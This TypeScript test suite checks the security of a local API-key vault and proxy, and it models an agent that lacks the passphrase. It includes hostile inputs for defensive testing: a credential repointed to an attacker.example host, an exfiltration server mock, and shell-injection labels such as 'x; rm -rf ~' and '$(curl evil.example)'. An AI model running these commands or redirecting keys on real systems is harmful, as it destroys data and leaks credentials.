import { sessionCookie } from './helpers.ts';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { after, before, test } from 'node:test';

// Each test plays a local program (an AI agent, say) that can run commands, read and write
// files in ~/.wickey, and call the dashboard API, but doesn't know the passphrase.

const home = fs.mkdtempSync(path.join(os.tmpdir(), 'wickey-sec-test-'));
process.env.WICKEY_HOME = home;
process.env.WICKEY_SCRYPT_N = '1024';
process.env.WICKEY_GRACE = '0';

const PASS = 'correct horse battery staple';
const { createProxyServer } = await import('../src/proxy.ts');
const store = await import('../src/store.ts');
const session = await import('../src/session.ts');
const vault = await import('../src/vault.ts');
session.setUp(PASS);

let upstreamHits: { url: string; auth?: string }[] = [];
let attackerHits: { url: string; auth?: string }[] = [];
let attackerBase = '';
let upstreamBase = '';
let port = 0;
const servers: http.Server[] = [];

function listen(server: http.Server): Promise<number> {
  servers.push(server);
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve((server.address() as AddressInfo).port)));
}

before(async () => {
  const upstream = http.createServer((req, res) => {
    upstreamHits.push({ url: req.url!, auth: req.headers.authorization });
    res.end('{"ok":true}');
  });
  upstreamBase = `http://127.0.0.1:${await listen(upstream)}`;
  // A live server standing in for an attacker's, so "nothing was sent there" is actually observable.
  const attacker = http.createServer((req, res) => {
    attackerHits.push({ url: req.url!, auth: req.headers.authorization });
    res.end('{"stolen":true}');
  });
  attackerBase = `http://127.0.0.1:${await listen(attacker)}`;
  port = await listen(createProxyServer());
  vault.unlockVault(PASS);
  store.addCredential({ name: 'work', provider: 'custom', apiKey: 'sk-REAL-work-key', baseUrl: `${upstreamBase}/v1` });
});

after(() => {
  store.closeStore();
  for (const s of servers) s.close();
  fs.rmSync(home, { recursive: true, force: true });
});

const db = () => new DatabaseSync(path.join(home, 'wickey.db'));
const useProxy = (id: string, token: string) =>
  fetch(`http://127.0.0.1:${port}/p/${id}/models`, { headers: { authorization: `Bearer ${token}` } });
async function api(method: string, p: string, body?: Record<string, unknown>) {
  const cookie = await sessionCookie();
  return fetch(`http://127.0.0.1:${port}${p}`, {
    method, headers: { 'x-wickey': '1', 'content-type': 'application/json', cookie }, body: body ? JSON.stringify(body) : undefined,
  }).then(async (r) => ({ status: r.status, body: await r.json() as any }));
}

test('the vault file never contains the real key, and the wrong passphrase opens nothing', () => {
  const raw = fs.readFileSync(path.join(home, 'vault.json'), 'utf8');
  assert.ok(!raw.includes('sk-REAL-work-key'));
  assert.ok(!fs.readFileSync(path.join(home, 'wickey.db')).includes('sk-REAL-work-key'), 'nor does the database');
  assert.throws(() => vault.verifyPassphrase('wrong passphrase!'), vault.WrongPassphraseError);
});

test('swapping or editing encrypted secrets in vault.json is detected', () => {
  const file = path.join(home, 'vault.json');
  const original = fs.readFileSync(file, 'utf8');
  const v = JSON.parse(original);
  const [id] = Object.keys(v.secrets);
  v.secrets['someone-elses-id'] = v.secrets[id]; // copy a box under another credential's id
  fs.writeFileSync(file, JSON.stringify(v));
  assert.throws(() => vault.getSecret('someone-elses-id'), 'a box is bound to its credential id');
  v.secrets[id].data = Buffer.from('tampered').toString('base64');
  fs.writeFileSync(file, JSON.stringify(v));
  assert.throws(() => vault.getSecret(id), 'GCM rejects edited ciphertext');
  fs.writeFileSync(file, original);
});

test('minting through the API needs the passphrase; reading an active key does not', async () => {
  const noPass = await api('POST', '/api/proxies', { credential: 'work', ttl: '1h' });
  assert.equal(noPass.status, 401);
  assert.equal(noPass.body.error.code, 'passphrase_required');
  const wrong = await api('POST', '/api/proxies', { credential: 'work', ttl: '1h', passphrase: 'not it at all' });
  assert.equal(wrong.body.error.code, 'wrong_passphrase');
  const ok = await api('POST', '/api/proxies', { credential: 'work', ttl: '1h', passphrase: PASS });
  assert.equal(ok.status, 201);

  for (const [method, p, body] of [
    ['POST', `/api/proxies/${ok.body.proxy.id}/rotate`, {}],
    ['POST', `/api/proxies/${ok.body.proxy.id}/renew`, {}],
    ['POST', '/api/credentials', { name: 'new', provider: 'openai', apiKey: 'k' }],
    // Editing could point the real key at another server, so it is gated like minting.
    ['PATCH', '/api/credentials/work', { baseUrl: 'https://attacker.example/v1' }],
  ] as const) {
    assert.equal((await api(method, p, body)).body.error?.code, 'passphrase_required', `${method} ${p}`);
  }
  assert.equal(store.getCredential('work')!.baseUrl, `${upstreamBase}/v1`);

  // Taking access away never needs the passphrase.
  assert.equal((await api('POST', `/api/proxies/${ok.body.proxy.id}/expire`)).status, 200);
  assert.equal((await api('DELETE', `/api/proxies/${ok.body.proxy.id}`)).status, 200);
});

test('`env` always needs the passphrase and mints a new key each time', async () => {
  const blocked = await api('POST', '/api/env', { label: 'shell', credential: 'work', ttl: '1h' });
  assert.equal(blocked.body.error.code, 'passphrase_required', 'an agent re-running the .zshrc line gets no key');
  const first = await api('POST', '/api/env', { label: 'shell', credential: 'work', ttl: '1h', passphrase: PASS });
  assert.equal(first.status, 200);
  const second = await api('POST', '/api/env', { label: 'shell', credential: 'work', ttl: '1h', passphrase: PASS });
  assert.notEqual(second.body.token, first.body.token);
  assert.notEqual(second.body.proxy.id, first.body.proxy.id);
  // Without the passphrase there is no way to get the earlier key back.
  const again = await api('POST', '/api/env', { label: 'shell', credential: 'work', ttl: '1h' });
  assert.equal(again.body.token, undefined);
  await api('POST', `/api/proxies/${first.body.proxy.id}/expire`);
  assert.equal((await useProxy(first.body.proxy.id, first.body.token)).status, 401);
});

test('a proxy row written straight into the database is rejected', async () => {
  const cred = store.getCredential('work')!;
  const token = 'sk-wick-forged';
  const { createHash } = await import('node:crypto');
  const conn = db();
  conn.prepare('INSERT INTO proxies (id, label, credential_id, token_hash, token_tail, ttl_seconds, created_at, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
    .run('f0f0f0f0', 'forged', cred.id, createHash('sha256').update(token).digest('hex'), token.slice(-5), 3600, Date.now(), Date.now() + 3600_000);
  conn.close();
  upstreamHits = [];
  const res = await useProxy('f0f0f0f0', token);
  assert.equal(res.status, 401);
  assert.match((await res.json()).error.message, /integrity check/);
  assert.equal(upstreamHits.length, 0);
});

test('extending an expiry or repointing a credential in the database is rejected', async () => {
  vault.unlockVault(PASS);
  const { proxy, token } = store.issueProxy({ credential: 'work', ttlSeconds: 1 });
  store.expireProxy(proxy.id);
  const conn = db();
  conn.prepare('UPDATE proxies SET expires_at = ? WHERE id = ?').run(Date.now() + 3600_000, proxy.id);
  upstreamHits = [];
  assert.equal((await useProxy(proxy.id, token)).status, 401, 'expiry was moved without re-signing');

  const live = store.issueProxy({ credential: 'work', ttlSeconds: 3600 });
  conn.prepare('UPDATE credentials SET base_url = ? WHERE name = ?').run(`${attackerBase}/steal`, 'work');
  conn.close();
  attackerHits = [];
  const res = await useProxy(live.proxy.id, live.token);
  assert.equal(res.status, 502, 'refuses to send the real key to a base URL changed behind its back');
  assert.deepEqual(attackerHits, [], 'the real key never reaches the substituted server');

  db().prepare('UPDATE credentials SET base_url = ? WHERE name = ?').run(`${upstreamBase}/v1`, 'work');
  assert.equal((await useProxy(live.proxy.id, live.token)).status, 200, 'restoring the signed value works again');
});

test('the grace period lets minting skip the passphrase, then ends on time or on lock', async () => {
  process.env.WICKEY_GRACE = '1';
  try {
    assert.equal((await api('POST', '/api/unlock', { passphrase: PASS })).status, 200);
    assert.equal((await api('POST', '/api/proxies', { credential: 'work' })).status, 201, 'inside the grace period');
    await new Promise((r) => setTimeout(r, 1100));
    assert.equal((await api('POST', '/api/proxies', { credential: 'work' })).status, 401, 'after it ends');

    await api('POST', '/api/unlock', { passphrase: PASS });
    assert.ok((await api('GET', '/api/state')).body.session.graceRemaining > 0);
    await api('POST', '/api/lock');
    assert.equal((await api('GET', '/api/state')).body.session.graceRemaining, 0);
    assert.equal((await api('POST', '/api/proxies', { credential: 'work' })).status, 401, 'Lock now ends it');
  } finally {
    process.env.WICKEY_GRACE = '0';
  }
});

test('a tampered vault entry returns an error instead of taking the proxy down', async () => {
  const { proxy, token } = store.issueProxy({ credential: 'work', ttlSeconds: 3600 });
  const file = path.join(home, 'vault.json');
  const original = fs.readFileSync(file, 'utf8');
  const v = JSON.parse(original);
  for (const box of Object.values(v.secrets) as { data: string }[]) box.data = Buffer.from('garbage').toString('base64');
  fs.writeFileSync(file, JSON.stringify(v));
  const res = await useProxy(proxy.id, token);
  assert.equal(res.status, 500);
  fs.writeFileSync(file, original);
  assert.equal((await useProxy(proxy.id, token)).status, 200, 'and the proxy is still up afterwards');
});

test('a locked proxy forwards nothing', async () => {
  vault.unlockVault(PASS);
  const { proxy, token } = store.issueProxy({ credential: 'work', ttlSeconds: 3600 });
  vault.lockVault();
  upstreamHits = [];
  const res = await useProxy(proxy.id, token);
  assert.equal(res.status, 503);
  assert.equal(upstreamHits.length, 0);
  vault.unlockVault(PASS);
});

test('proxy names are restricted, so the copyable Shell profile line cannot carry a shell command', async () => {
  // Names end up inside `eval "$(wickey env <name> ...)"` snippets that users paste into a shell.
  for (const label of ['x; rm -rf ~', '$(curl evil.example)', 'a`id`', 'with space', 'quote"', 'x'.repeat(65)]) {
    const issued = await api('POST', '/api/proxies', { credential: 'work', label, passphrase: PASS });
    assert.equal(issued.status, 400, `issue accepted ${JSON.stringify(label)}`);
    const env = await api('POST', '/api/env', { label, credential: 'work', passphrase: PASS });
    assert.equal(env.status, 400, `env accepted ${JSON.stringify(label)}`);
  }
  assert.ok(!store.listProxies().some((p) => /[;$`" ]/.test(p.label ?? '')));
  const ok = await api('POST', '/api/proxies', { credential: 'work', label: 'my-agent_2.v1', passphrase: PASS });
  assert.equal(ok.status, 201, 'normal names still work');
});

// Last: it leaves the attempt throttle engaged.
test('guessing the passphrase through the API is throttled', async () => {
  for (let i = 0; i < 5; i++) assert.equal((await api('POST', '/api/unlock', { passphrase: `guess-${i}-xxxx` })).status, 401);
  const throttled = await api('POST', '/api/unlock', { passphrase: PASS });
  assert.equal(throttled.status, 429, 'even the right passphrase waits once the limit is hit');
  assert.match(throttled.body.error.message, /Try again in \d+s/);
});
